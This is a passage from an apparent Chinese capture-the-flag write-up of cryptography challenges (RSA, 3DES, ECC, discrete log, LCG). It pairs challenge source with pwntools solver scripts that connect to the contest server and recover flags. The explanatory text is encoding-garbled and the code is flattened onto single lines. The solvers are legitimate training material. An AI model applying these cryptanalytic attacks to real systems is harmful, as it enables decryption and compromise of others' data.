223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089x1 = pow(c1 * pow(3, -e1, n),e2,n)x2 = pow(c2 * pow(7, -e2, n),e1,n)p = gcd(x1-x2, n)q = n//pf = (p-1)*(q-1)d = inverse_mod(e,f)m= pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;SYC&#123;poly_rsa_Just_need5_s1mple_gcd&#125;&#x27; â€‹ Simple3DES é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:23333 https://blog.csdn.net/Mr_wzc/article/details/121713518 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from Crypto.Cipher import DES3from Crypto.Util.number import *import osimport randomimport stringimport hashlibxor = lambda a,b: bytes([a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))])pad = lambda msg,padlen: msg+chr((padlen-(len(msg)%padlen))).encode()*(padlen-(len(msg)%padlen))flag = os.environ.get(&quot;FLAG&quot;, &quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;).encode()sec = os.urandom(8)banner = &#x27;|&#x27;*70DEBUG = False def proof_of_work(): if DEBUG: return True proof = &#x27;&#x27;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) digest = hashlib.sha256(proof.encode()).hexdigest() print(&quot;sha256(XXXX+%s) == %s&quot; % (proof[4:], digest)) x = input(&quot;Give me XXXX: &quot;) if len(x)!=4 or hashlib.sha256((x+proof[4:]).encode()).hexdigest() != digest: return False print(&quot;Right!&quot;) return Truedef enc(msg,key): try: key = long_to_bytes(key) msg = xor(long_to_bytes(msg),sec) des = DES3.new(key,DES3.MODE_ECB) ct = xor(des.encrypt(pad(msg,8)),sec) return bytes_to_long(ct) except Exception as e: print(e) return Exceptiondef service(): cnt = 0 if not proof_of_work(): exit() print(banner) print(&#x27;Simple DES Encryption Service&#x27;) print(banner) while cnt&lt;2: print(&#x27;1. Encrypt\\n2. Get encrypted flag.&#x27;) choice = int(input(&#x27;&gt; &#x27;)) if choice == 1: print(&#x27;Input msg:&#x27;) msg = int(input(&#x27;&gt; &#x27;).strip()) print(&#x27;Input key:&#x27;) key = int(input(&#x27;&gt; &#x27;).strip()) print(enc(msg,key)) elif choice == 2: print(&#x27;Input key:&#x27;) key = int(input(&#x27;&gt; &#x27;).strip()) print(enc(bytes_to_long(flag),key)) else: exit() cnt+=1 print(banner) print(&#x27;Bye!&#x27;) exit()try: service()except Exception: print(&quot;Something goes wrong...\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() ä»£ç é—®é¢˜åœ¨å…ˆxoråpadï¼Œå¯¹äº m=b&#39;\\x00&#39;ï¼Œæœ‰ m^sec=secï¼Œpad(sec,8)=sec+b&#39;\\x08&#39;*8ã€‚ ç¬¬ä¸€è½®ï¼š pad(sec,8)=sec+b&#39;\\x08&#39;*8ï¼ŒåŠ å¯†å¾—åˆ° c1^x | c2^xï¼Œåˆç”± b&#39;\\x08&#39;*8 å¯æ±‚å‡º c2ï¼Œå¾—åˆ° xã€‚ ç¬¬äºŒè½®ï¼š å·²çŸ¥ c&#39;^xï¼Œè§£å¯†å¾—åˆ° flag^xï¼Œå†å¼‚æˆ–å¾—åˆ° flagã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcefrom Crypto.Util.number import *from Crypto.Cipher import DES3r = remote(&quot;59.110.20.54&quot;,23333)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()xor = lambda a,b: bytes([a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))])m = bytes_to_long(b&#x27;\\x00&#x27;)key = bytes_to_long(b&#x27;abcdefgh&#x27;+b&#x27;ijklmnop&#x27;+b&#x27;qrstuvwx&#x27;)r.recvuntil(b&#x27;flag.\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,b&#x27;1&#x27;)r.recvuntil(b&#x27;msg:\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,str(m).encode())r.recvuntil(b&#x27;key:\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,str(key).encode())c_xor = long_to_bytes(eval(r.recvline()))c1_xor,c2_xor = c_xor[:8],c_xor[8:]des = DES3.new(long_to_bytes(key),DES3.MODE_ECB)c2 = des.encrypt(b&#x27;\\x08&#x27;*8)sec = xor(c2,c2_xor)print(sec)r.recvuntil(b&#x27;flag.\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,b&#x27;2&#x27;)r.recvuntil(b&#x27;key:\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,str(key).encode())flag_c_xor = long_to_bytes(eval(r.recvline()))flag_c = xor(flag_c_xor,sec)flag_xor = des.decrypt(flag_c)flag = xor(flag_xor,sec)print(flag)r.interactive()# b&#x27;SYC&#123;DES_1s_0ut_0f_t1me&#125;o&#x27; â€‹ JPGDiff å›¾ç‰‡ä¸­çš„å­—ç¬¦ä¸²å³ä¸ºflag æç¤ºå›¾ç‰‡ä¸ºHilbertæ›²çº¿ï¼Œä¸”é•¿å›¾ä¸º1*65536çš„jpgå›¾ç‰‡ï¼Œç¬¦åˆ8é˜¶Hilbertæ›²çº¿çš„èŠ‚ç‚¹æ•°ã€‚ æŒ‰8é˜¶Hilbertæ›²çº¿çš„é¡ºåºæ¥å¸ƒç½®æ¯ä¸€ä¸ª1*1åƒç´ ï¼Œå³å¯è¿˜åŸåŸå§‹å›¾ç‰‡ã€‚ åˆ©ç”¨hilbertcurveåŒ…å®Œæˆæ„é€ ï¼š 123456789101112131415161718192021from hilbertcurve.hilbertcurve import HilbertCurvefrom PIL import Image im_cp = Image.open(&quot;ct.png&quot;)im_new = Image.new(&#x27;RGB&#x27;,(256,256)) p=8; n=2hilbert_curve = HilbertCurve(p, n)distances = list(range(65536))points = hilbert_curve.points_from_distances(distances)order = []for point, dist in zip(points, distances): #print(f&#x27;&#123;dist&#125; = &#123;tuple(point)&#125;&#x27;) order.append(tuple(point))print(len(order))for k in range(65536): tmp = im_cp.getpixel((0,k)) im_new.putpixel(order[k],tmp) im_new.save(&#x27;m.png&#x27;) å¾—åˆ°å›¾ç‰‡ï¼š flagï¼šSYC&#123;H1LB5RT_C1pher&#125; â€‹ Energetic_Carcano é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:8763 https://en.wikipedia.org/wiki/Elliptic-curve_cryptography 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# from sage.all import *import os import random import string import hashlib from Crypto.Util.number import * DEBUG = Truebanner = &#x27;|&#x27;*70 flag = os.environ.get(&quot;FLAG&quot;, b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;).encode()pbits = 120abp = &quot;abp&quot; def proof_of_work(): if DEBUG: return True proof = &#x27;&#x27;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) digest = hashlib.sha256(proof.encode()).hexdigest() print(&quot;sha256(XXXX+%s) == %s&quot; % (proof[4:], digest)) x = input(&quot;Give me XXXX: &quot;) if len(x)!=4 or hashlib.sha256((x+proof[4:]).encode()).hexdigest() != digest: return False print(&quot;Right!&quot;) return Truedef check(a,b,p,turn,ans): if DEBUG: return True try: if turn == &quot;a&quot;: return int(a) == ans if turn == &quot;b&quot;: return int(b) == ans if turn == &quot;p&quot;: return int(p) == ans except Exception: exit()try: if not proof_of_work(): exit() print(banner) print(&#x27;\\nHi Crypto-ers! AL3XEI here. I know you are excellent at math, so I prepared a game for u.&#x27;) print(&#x27;In the equation y^2 = x^3+ a*x + b (mod p), 4 points are given. Plz give me the right a, b or p to contine the game.&#x27;) print(&#x27;Good Luck!\\n&#x27;) print(banner+&#x27;\\n&#x27;) for i in range(10): turn = random.choice(abp) p = getPrime(pbits) a,b = [next_prime(random.randint(2,p)) for _ in &quot;ab&quot;] curve = EllipticCurve(GF(p),[a,b]) pts = [curve.random_point() for _ in range(4)] pts = [(_[0], _[1]) for _ in pts] for _ in pts: print(_,end=&quot; &quot;) print(&#x27;\\nGive me &#x27;+turn+&quot; :&quot;) ans = int(input(&#x27;&gt; &#x27;)) if check(a,b,p,turn,ans): print(&quot;Good! Next challenge-&gt;\\n&quot;) print(banner+&#x27;\\n&#x27;) pbits+=5 continue else: print(&quot;Something goes wrong...\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() print(&#x27;Congrats! Your flag is:&#x27;,flag)except Exception: print(&quot;Something goes wrong...\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() ç±»ä¼¼LCGè®¡ç®— $a,b,p$ çš„æ–¹æ³•ï¼Œåˆ©ç”¨ç»“å¼è®¡ç®— $a,b,p$ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcefrom sage.matrix.matrix2 import Matrixdef resultant(f1, f2, var): return Matrix.determinant(f1.sylvester_matrix(f2, var))r = remote(&quot;59.110.20.54&quot;,int(8763))table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()r.recvuntil(b&#x27;Luck!\\n&#x27;)for i in range(10): r.recvline() r.recvline() r.recvline() (x1,y1),(x2,y2),(x3,y3),(x4,y4) = eval(r.recvline().replace(b&#x27;) (&#x27;, b&#x27;), (&#x27;)) PR.&lt;a,b,p,k1,k2,k3,k4&gt; = PolynomialRing(ZZ) f1 = (y1^2+k1*p)-(x1^3+a*x1+b) f2 = (y2^2+k2*p)-(x2^3+a*x2+b) f3 = (y3^2+k3*p)-(x3^3+a*x3+b) f4 = (y4^2+k4*p)-(x4^3+a*x4+b) g1 = resultant(f1, f2, b) g2 = resultant(f2, f3, b) g3 = resultant(f3, f4, b) h1 = resultant(g1, g2, a) h2 = resultant(g2, g3, a) p_gcd = gcd(h1(p=0),h2(p=0)) p = list(zip(*factor(p_gcd)))[0][-1] PR.&lt;a,b&gt; = PolynomialRing(Zmod(p)) f1 = y1^2-(x1^3+a*x1+b) f2 = y2^2-(x2^3+a*x2+b) g = resultant(f1, f2, b) a = g.univariate_polynomial().roots()[0][0] b = y1^2-(x1^3+a*x1) print(f&#x27;a = &#123;a&#125;&#x27;) print(f&#x27;b = &#123;b&#125;&#x27;) print(f&#x27;p = &#123;p&#125;&#x27;) print(f2(a,b)) r.recvuntil(b&#x27;me &#x27;) op = r.recv(1) print(op) r.recvuntil(b&#x27;&gt; &#x27;) if op == b&#x27;a&#x27;: r.sendline(str(a).encode()) elif op == b&#x27;b&#x27;: r.sendline(str(b).encode()) else: r.sendline(str(p).encode()) print(r.recvline())r.interactive()# Congrats! Your flag is: b&#x27;SYC&#123;ECC_M4ster&#125;&#x27; â€‹ Just need One é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:2613 One bullet to kill all Outlaws. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import os import random import string import hashlib flag = os.environ.get(&quot;FLAG&quot;, b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;)DEBUG = Falsebanner = &#x27;|&#x27;*70if DEBUG: print(&quot;==DEBUG MODE==&quot;) def proof_of_work(): if DEBUG: return True proof = &#x27;&#x27;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) digest = hashlib.sha256(proof.encode()).hexdigest() print(&quot;sha256(XXXX+%s) == %s&quot; % (proof[4:], digest)) x = input(&quot;Give me XXXX: &quot;) if len(x)!=4 or hashlib.sha256((x+proof[4:]).encode()).hexdigest() != digest: return False print(&quot;Right!&quot;) return True try: if not proof_of_work(): exit() print(banner) parms = [random.getrandbits(32) for _ in range(128)] res = res = int(input(&#x27;Give me x calculating f(x) :\\n&gt; &#x27;)) if res &gt;= 2**32: print(&quot;Give me something smaller.\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() cnt = 0 for _ in range(128): cnt += pow(res,_)*parms[_] print(cnt) ans = input(&#x27;Give me Coefficients :\\n&gt; &#x27;) ans = [int(_) for _ in ans.split(&quot;,&quot;)] if ans == parms: print(&#x27;Congrats! Your flag is:&#x27;,flag) else: exit()except Exception: print(&quot;Something goes wrong...\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() æœ¬è´¨æ˜¯è¿›åˆ¶è½¬æ¢çš„è®¡ç®—æ–¹æ³•ï¼Œæä¾› $x$ åç»™å‡º $\\sum\\limits_{i=0}^{128}p_ix^i$ï¼Œæ±‚å„ $p_i$ã€‚åˆ©ç”¨å–ä½™å’Œæ•´é™¤è®¡ç®—å³å¯ã€‚ 12345678910111213141516171819202122232425262728293031323334from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&quot;59.110.20.54&quot;,2613)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()r.recvuntil(b&#x27;&gt; &#x27;)x = 4294967295r.sendline(b&#x27;4294967295&#x27;)c = eval(r.recvline())print(c)r.recvuntil(b&#x27;&gt; &#x27;)param = []for i in range(128): param.append(c % x) c = (c-param[-1])//xr.sendline(str(param).encode().strip(b&#x27;[&#x27;).strip(b&#x27;]&#x27;))r.interactive() â€‹ Fi1nd_th3_xâ€™ å¬è¯´åœ¨é‚£ä¸ªå¤§é™†æœ‰ä½å«jrl777çš„æ—…è¡Œè€…â€¦â€¦Cryptoerç©¿è¶Šåˆ°äº†æç“¦ç‰¹å°±è¦æ‹¿å‡ºçœŸæœ¬äº‹ï¼ 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *from libnum import* from secret import flagp = getPrime(512)q = getPrime(512)r = getPrime(512)e = getPrime(32)n = p*q*rphi = (p-1)*(q-1)*(r-1)d = inverse(e,phi)dP = d%((q-1)*(r-1))dQ = d%((p-1)*(r-1))dR = d%((p-1)*(q-1))m = s2n(flag.encode())c = pow(m,e,n)print(&#x27;p=&#x27;,p)print(&#x27;q=&#x27;,q)print(&#x27;r=&#x27;,r)print(&#x27;dP=&#x27;,dP)print(&#x27;dQ=&#x27;,dQ)print(&#x27;dR=&#x27;,dR)print(&#x27;c=&#x27;,c)&#x27;&#x27;&#x27;p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009&#x27;&#x27;&#x27; ç”±äº $m&lt;qr,m&lt;pr,m&lt;pq$ï¼Œæ•… $m=c^{dP} \\bmod {qr}=c^{dQ} \\bmod {pr}=c^{dR} \\bmod {pq}$ï¼Œå¦åˆ™éœ€åº”ç”¨CRTæ¥æ±‚ $m$ã€‚ 1234567891011121314p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009m1=pow(c,dP,q*r)m2=pow(c,dQ,p*r)m3=pow(c,dR,p*q)print(bytes.fromhex(hex(m1)[2:]))# b&#x27;SYC&#123;CRT_1s_f3n_but_Gen3hi_im9act_is_a_balabalaba&#125;&#x27; â€‹ Quick_Robert é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:3042 https://en.wikipedia.org/wiki/Quadratic_residue å‚è€ƒ Some sums of Legendreâ€™s symbolsï¼Œåˆ©ç”¨äºŒæ¬¡å‰©ä½™çš„æ±‚å’Œç‰¹æ€§è®¡ç®—ï¼š $\\sum\\limits_{x=0}^{p-1}\\left(\\cfrac{ax^2+bx+c}p\\right) = \\left\\{\\begin{array}{cl}-\\left(\\cfrac ap\\right),&amp; p \\nmid b^2-4ac \\newline (p-1)\\left(\\cfrac ap\\right),&amp; p \\mid b^2-4ac \\end{array}\\right.$ 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforceimport sympyr = remote(&quot;59.110.20.54&quot;,3042)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()r.recvuntil(b&#x27;success!&#x27;)for i in range(10): print(i) r.recvuntil(b&#x27;|||||\\n\\n&#x27;) a = eval(r.recvuntil(b&#x27;*&#x27;)[:-1]) r.recvuntil(b&#x27;+&#x27;) b = eval(r.recvuntil(b&#x27;*&#x27;)[:-1]) r.recvline() exec(r.recvuntil(b&#x27;(&#x27;)[:-1]) print(f&#x27;a = &#123;a&#125;&#x27;) print(f&#x27;b = &#123;b&#125;&#x27;) print(f&#x27;p = &#123;p&#125;&#x27;) delta = b**2-4*a x = sympy.legendre_symbol(a,p) x = x*(p-1 if delta%p==0 else -1) print(f&#x27;x = &#123;x&#125;&#x27;) r.sendlineafter(b&#x27;answer: &#x27;,str(x).encode()) print(r.recvline()) print()r.interactive() â€‹ Diligent_Liszt https://en.wikipedia.org/wiki/Discrete_logarithm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import gmpy2 as gp import random from Crypto.Util.number import * DEBUG = False flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;assert flag.startswith(b&quot;SYC&quot;)nbits = 512g = 3 def gen_p_1(digit): primes = [] pri = 1 while(len(primes)&lt;100): pri = gp.next_prime(pri) primes.append(int(pri)) while True: count = 2 while count &lt; 2**digit: count *= random.choice(primes) count += 1 if(gp.is_prime(count)): return count p,q,r = [gen_p_1(nbits) for _ in &quot;pqr&quot;] n = p*q*r x = bytes_to_long(flag) y = gp.powmod(g,x,n) print(&quot;p = &#123;&#125;&quot;.format(p))print(&quot;q = &#123;&#125;&quot;.format(q))print(&quot;r = &#123;&#125;&quot;.format(r)) print(&quot;y = &#123;&#125;&quot;.format(y)) if DEBUG: print(&quot;x = &#123;&#125;&quot;.format(x)) &#x27;&#x27;&#x27;p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266&#x27;&#x27;&#x27; DLPï¼ŒPohligâ€“Hellmanç®—æ³•+CRTã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266g = 3 def babystep_giantstep(g, y, p, q=None): if q is None: q = p - 1 m = int(q**0.5 + 0.5) # Baby step table = &#123;&#125; gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step try: gm = pow(g, -m, p) # gm = g^&#123;-m&#125; except: return None ygqm = y # ygqm = y * g^&#123;-qm&#125; for q in range(m): if ygqm in table: return q * m + table[ygqm] ygqm = (ygqm * gm) % p return None# Pohligâ€“Hellmanæ³•def pohlig_hellman_DLP(g, y, p): crt_moduli = [] crt_remain = [] for q, _ in factor(p-1): x = babystep_giantstep(pow(g,(p-1)//q,p), pow(y,(p-1)//q,p), p, q) if (x is None) or (x &lt;= 1): continue crt_moduli.append(q) crt_remain.append(x) x = crt(crt_remain, crt_moduli) return xxp = pohlig_hellman_DLP(g, y%p, p)xq = pohlig_hellman_DLP(g, y%q, q)xr = pohlig_hellman_DLP(g, y%r, r)x = crt([xp,xq,xr],[p-1,q-1,r-1])print(bytes.fromhex(hex(x)[2:]))b&#x27;SYC&#123;D1scr3te_L0g_W1th_Mult1pl3_pr1m35&#125;&#x27; â€‹ card_game AL3XEIé€ç»™äº†ä½ è¿™ä¸ªæ¸¸æˆçš„å…³é”®æ•°æ®ï¼Œä½ èƒ½é¢„æµ‹æ¥ä¸‹æ¥è¦å‡ºçš„ç‰Œå— nc 59.110.20.54 4953 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101from Crypto.Util.number import *from cards import Heart, Spade, Club, Diamondfrom secret import flagdef choose_card(num): x = (num&gt;&gt;5)%4 if x == 0: return (Heart[(num&gt;&gt;6)%13]), &#x27;Heart&#x27; if x%4 == 1: return (Spade[(num&gt;&gt;6)%13]), &#x27;Spade&#x27; if x%4 == 2: return (Diamond[(num&gt;&gt;6)%13]), &#x27;Diamond&#x27; else: return (Club[(num&gt;&gt;6)%13]), &#x27;Club&#x27;def GAME(): banner = &#x27;&#x27;&#x27; #### ## ##### ##### #### ## # # ###### # # # # # # # # # # # # ## ## # # # # # # # # # # # # ## # ##### # ###### ##### # # # ### ###### # # # # # # # # # # # # # # # # # # #### # # # # ##### #### # # # # ######&#x27;&#x27;&#x27; print(banner) meum = &#x27;&#x27;&#x27;option: 1: start game 2: get hint 3: exit &#x27;&#x27;&#x27; print(meum) while True: print(&#x27;input your option: &#x27;, end=&#x27;&#x27;) your_input = input() if your_input == &#x27;1&#x27;: n = getPrime(36) m = getPrime(16) c = getPrime(16) seed = getPrime(36) out = seed round = 0 score = 0 res = [] while True: round += 1 res = [] print(f&#x27;round:&#123;round&#125;&#x27;) print(f&#x27;score:&#123;score&#125;&#x27;) for i in range (3): out = (out*m+c)%n res.append(out) if round == 1: for i in res: card, suit = choose_card(i) print(card) elif round==2 or round==3: #gift for i in res: card, suit = choose_card(i) print(card) print(f&#x27;gift: &#123;res&#125;&#x27;) else: cards = [] suits = [] for i in range(len(res)): card, suit = choose_card(res[i]) cards.append(card) suits.append(suit) print(&quot;Give me your guess: (example: Heart_1 Club_2 Diamond_3)&quot;) try: g_1, g_2, g_3 = input().split() g_1, g_2, g_3 = g_1.split(&#x27;_&#x27;), g_2.split(&#x27;_&#x27;), g_3.split(&#x27;_&#x27;) except ValueError: print(&quot;Please enter in the correct format.&quot;) return if (g_1[0] == suits[0] and g_1[1] == cards[0][15]) and (g_2[0] == suits[1] and g_2[1] == cards[1][15]) and (g_3[0] == suits[2] and g_3[1] == cards[2][15]): for i in cards: print(i) print(&quot;Congratulations! You matched the cards!&quot;) score += 1 else: for i in cards: print(i) print(&quot;Try again!&quot;) if score == 50: print(&#x27;The flag is your reward!&#x27;) print(flag) return else: continue if your_input == &#x27;2&#x27;: print(&quot;Have you ever heard of LCG?&quot;) if your_input == &#x27;3&#x27;: breakif __name__ == &#x27;__main__&#x27;: GAME() ä»£ç é€»è¾‘æœ¬è´¨æ˜¯LCGï¼Œæœ‰ä¸ªå‘ç‚¹ï¼Œæ¯”å¯¹çš„æ—¶å€™ï¼Œ10æ˜¯0ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcefrom functools import reducefrom math import gcdfrom Crypto.Util.number import *def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * 